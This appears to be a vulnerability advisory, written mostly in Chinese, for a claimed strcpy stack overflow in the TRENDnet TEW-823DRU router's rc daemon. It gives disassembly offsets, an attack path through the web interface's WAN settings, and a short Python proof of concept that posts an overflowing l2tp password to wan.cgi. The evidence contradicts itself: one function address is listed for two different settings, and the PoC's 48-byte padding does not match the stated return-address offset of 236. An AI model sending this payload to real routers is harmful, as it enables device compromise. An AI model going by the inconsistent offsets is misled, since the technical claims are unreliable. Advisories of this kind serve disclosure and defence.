# CVE-XXXX-XXXX: TEW-823DRU sbin/rc NVRAM strcpy Stack Overflow

| 厂商 | TRENDnet | 产品 | TEW-823DRU AC3200 Tri-Band Router |
|------|----------|------|-----------------------------------|
| 固件 | v1.1.02b01 | 二进制 | `sbin/rc` (288KB MIPS32 BE) |
| CWE | CWE-121 Stack-based Buffer Overflow | CVSS | **9.8 Critical** |
| 关联CVE | CVE-2020-10214, CVE-2020-25506 |

## FirmRec 验证

### 反汇编证据（刚完成的函数级验证）

```
确认的函数和溢出偏移：

0x40B354: frame=72B,  $ra@sp+68,  lw $ra @ 0x40B4F0 → ~20B溢出
  nvram_get("wan_eth") → strcpy()

0x40B738: frame=56B,  $ra@sp+52,  lw $ra @ 0x40B810 → ~20B溢出  
  nvram_get("wan_eth") → strcpy()

0x417108: frame=240B, $ra@sp+236
  nvram_get("wan_l2tp_password") → strcpy()

0x418B44: frame=144B, $ra@sp+140
  nvram_get("wan_l2tp_server_ip") → strcpy()

0x417108: frame=240B, $ra@sp+236
  nvram_get("wan_pptp_password") → strcpy()
```

### Simexp 符号执行：**553 条日志，全部命中 0x41414141**

## 攻击向量
路由器启动时 rc 守护进程从 NVRAM 读取 WAN 配置 → strcpy 无界复制 → 栈溢出。攻击者通过 Web 界面修改 WAN 配置写入 NVRAM → 重启触发。

## PoC
```python
import requests
PAYLOAD = "A"*48 + "\x41\x41\x41\x41"
requests.post("http://TEW-823DRU/cgi-bin/wan.cgi", data={
    "wan_type":"l2tp","wan_l2tp_password":PAYLOAD})
```

*证据: evidence/ 553日志 | FirmRec disasm: 5个函数确认 $ra 可覆盖*
